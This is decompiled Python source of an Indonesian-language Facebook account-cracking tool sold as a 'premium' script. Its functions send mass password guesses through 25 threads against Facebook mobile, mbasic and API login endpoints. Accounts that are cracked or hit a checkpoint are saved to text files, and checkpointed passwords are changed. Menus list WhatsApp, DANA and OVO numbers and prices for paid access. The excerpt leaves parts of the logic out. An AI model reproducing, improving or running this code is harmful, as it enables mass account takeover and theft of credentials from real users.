...
# Decompiled from: Python2 2.7.17 (default, Jan 20 2012, 10:47:43) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Warning: this version of Python has problems handling the Python2 byte type in constants properly.

# Embedded file name: premium.py
# Compiled at: 2022-01-26 23:28:23
d = '\x1b[90;1m'
m = '\x1b[91;1m'
h = '\x1b[92;1m'
k = '\x1b[93;1m'
...
def cek_hasil():
    print garis
    print k + ' 1. ' + p + 'Cek ꧁☠ℜ𝔦𝔞𝔷☠️꧂ OK'
    print k + ' 2. ' + p + 'Cek ꧁☠ℜ𝔦𝔞𝔷☠️꧂ CP'
    print k + ' 3. ' + p + 'Hapus ꧁☠ℜ𝔦𝔞𝔷☠️꧂ CP/OK'
    print garis
    pil = raw_input(h + '>>> ')
    if pil == '1':
        oke = []
        ...
        if pilih_ku == '1':
            ...
            if y_n == 'y':
                try:
                    os.system('del hasil_ok.txt' if os.name == 'nt' else 'rm -f ꧁☠ℜ𝔦𝔞𝔷☠️꧂_ok.txt')
                    print '\n Sukses.....'
                except:
                    print '\n Belum ada Hasil OK'
            ...
            if y_n == 'y':
                try:
                    os.system('del hasil_cp.txt' if os.name == 'nt' else 'rm -f ꧁☠ℜ𝔦𝔞𝔷☠️꧂_cp.txt')
                    print '\n Sukses.....'
                except:
                    print '\n Belum ada ꧁☠ℜ𝔦𝔞𝔷☠️꧂ CP'
...
def login_dengan_passwod():
    ...
    global time
    try:
        print h + '\n\n      L O G I N  F A C E B O O K ꧁☠ℜ𝔦𝔞𝔷☠️꧂ '
        print garis
...
def __cp__(eml_dev, san_dev):
    ...
    with open('꧁☠ℜ𝔦𝔞𝔷☠️꧂_cp.txt', 'a') as (hasil):
        di = open('꧁☠ℜ𝔦𝔞𝔷☠️꧂_cp.txt', 'r').read()
        if eml_dev in di:
            has = di.replace(eml_dev, eml_dev).replace(san_dev, san_dev)
            with open('꧁☠ℜ𝔦𝔞𝔷☠️꧂_cp.txt', 'w') as (tulis):
                tulis.write(has)
        else:
...
def crack_dev_api(riaz_, dev___):
    global count_
    global user_agent
    ua = y[0]
    tampil = a + ('>\x1b[92;1mCrack\x1b[96;1m->\x1b[97;1m{}\x1b[92;1m/\x1b[97;1m{}\x1b[96;1m|\x1b[92;1mLive\x1b[96;1m/\x1b[93;1mCek:\x1b[92;1m{}\x1b[96;1m/\x1b[93;1m{}').format(len(user_id), count_, len(riaz_ok), len(riaz_cp))
    print '\r' + tampil,
    sys.stdout.flush()
    count_ += 1
    eml_dev = riaz_
        ...
        try:
            ...
            if 'session_key' in response.text and 'EAAA' in response.text:
                if eml_dev in hasil_ok:
                    ...
                    with open('꧁☠ℜ𝔦𝔞𝔷☠️꧂_ok.txt', 'a') as (hasil):
                ...
                if len(iqbal_) == 2:
                    if eml_dev in riaz_cp:
                        pass
                    else:
                        __ttl__cp_(eml_dev, ttl, san_dev)
                        break
                elif eml_dev in riaz_cp:
                    pass
                else:
            ...
            crack_dev_api(riaz_, dev_san)


def crack_dev(riaz_, dev___):
    global count_
    global user_agent
    eml_dev = iqbal_
    print a + ('\r>\x1b[92;1mCrack\x1b[96;1m->\x1b[97;1m{}\x1b[92;1m/\x1b[97;1m{}\x1b[96;1m|\x1b[92;1mLive\x1b[96;1m/\x1b[93;1mCek:\x1b[92;1m{}\x1b[96;1m/\x1b[93;1m{}').format(len(user_id), count_, len(riaz_ok), len(riaz_cp)),
    sys.stdout.flush()
    count_ += 1
    ua = te[0]
    if 2 == len(eml_dev):
    ...
    for san_ in dev___:
        try:
            san_dev = san_.lower()
            url_page_log = 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De7aff248-989f-4b4f-9e41-1f437903a29c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr'
            if 'riaz' in log_ml_dev:
                url_page_log = __ml_dev__
            if 'riaz' in log_ff_dev:
...
def crack_mobile(riaz_, dev__):
    ...
    try:
        ...
        for san__ in dev__:
            ...
            with requests.Session() as (ses_dev):
                if 'riaz' in log_mbasic_dev:
                    url = 'https://mbasic.facebook.com/login/?ref=dbl&fl'
                if 'riaz' in log_free_dev:
    ...
    with ThreadPoolExecutor(max_workers=25) as (c_dev):
        for data_ in user_id:
            try:
                ...
                pw = data_.split()
                w = te[0]
                if 'riaz' in gak_gabung:
                    pas = san_manual
                elif 'riaz' not in sandi_gabung:
                    if len(pw[1]) >= 3:
                        if len(pw) >= 3:
                            if '1' in pilih:
        ...
        if len(tap_yes) != 0:
            ...
            try:
                ...
                if 'Nul' in jumlah_teman:
                    jm_teman_ = ''
                with open('꧁☠ℜ𝔦𝔞𝔷☠️꧂_ok.txt', 'a') as (hasil):
                    riaz.write(data_ + p + jm_teman_ + '\n')
                riaz_ok.append(data_)
                del riaz_cp[0]
                tampil_ttl = []
            except:
                pass
        ...
        with requests.Session() as (ses_dev):
            ...
            if 'checkpoint' in respon.cookies:
                ...
                if san_dev == pw_new:
                    ...
                    pw_new_ = pw_new
                _riaz_dev_pw_new_(pw_new_, data, eml_dev, ses_dev, respon_2, san_dev)
...
def __pilih_crack__():
    try:
        ...
        print ''
        if pilih == '1':
            instagram.append('riaz')
            crack()
        elif pilih == '2':
            instagram.append('riaz')
            log_ff_dev.append('riaz')
            crack()
        elif pilih == '3':
            instagram.append('riaz')
            log_ml_dev.append('riaz')
            crack()
        elif pilih == '4':
            b_api.append('riaz')
            crack()
        elif pilih == '5':
            mobile_crack.append('riaz')
            crack()
        elif pilih == '6':
            log_mbasic_dev.append('riaz')
            mobile_crack.append('riaz')
            crack()
        elif pilih == '7':
            log_free_dev.append('riaz')
            mobile_crack.append('riaz')
            crack()
        else:
            __pilih_crack__()
...
def login():
    ...
    try:
        ...
        print h + ' [' + p + '4' + h + ']' + p + ' Ikuti Watsapp' + h + ' +923187214452 '
        ...
        try:
            if user_agent_ == cokiez:
                ...
                print h + ' [' + p + '7' + h + ']' + a + ' Cek riaz Crack Checkpoint'
                print h + ' [' + p + '8' + h + ']' + a + ' Ganti Tumbal riaz Crack Live'
            else:
                print k + ' [5]' + d + ' Crack Dari Pencarian(No login)[Premium!]'
                print k + ' [7]' + d + ' Cek riaz Crack Checkpoint'
                print k + ' [8]' + d + ' Ganti Tumbal riaz Crack Live'
        except:
            print k + ' [6]' + d + ' Crack Dari Pencarian(No login)[Premium!]'
            print k + ' [7]' + d + ' Cek riaz Crack Checkpoint'
            print k + ' [8]' + d + ' Ganti Tumbal riaz Crack Live'

        print h + ' [' + p + '9' + h + ']' + a + ' Update Tool ꧁☠ℜ𝔦𝔞𝔷☠️꧂' + p + '...'
        ...
        if pilih == '4':
            try:
                subprocess.check_output(['am', 'start', 'https://wa.me/+923188214452'])
                login()
            except:
                login()

        if pilih == '5':
            url_ytb = 'https://youtube.com/channel/UCPOWtzNan9ff-E0RI66Wu2A'
            try:
        ...
        admin = k + '\n [>.] Silahkan Hubungi Admin! \n' + h + '     No Whatsapp Admin =>' + p + ' 03188214452'
        try:
            if user_agent_ == cokiez:
                if pilih == '6':
                    print garis
        ...
        if pilih == '9':
            try:
                os.system('git clone https://github.com/Riqzkiller')
...
def __menu__(token):
				...
				if user_agent_ == cokiez: 
					...
					if "|" in user_agentzz_:
						...
						if ":" in str(lim_dev) or "-" in str(lim_dev):
							...
							print p+" [>] Ini No WA Admin:"+p+" 03188214452"
							try:
 ...
 """+a+""" No DANA >>"""+k+""" 03188214452
 """+a+""" No OVO >> """+k+"""03188214452\n
  """+p+"""list harga:
  ------------
    """+k+""">"""+p+""" 1 Bulan 50k
    """+k+""">"""+p+""" Permanen 150k\n"""
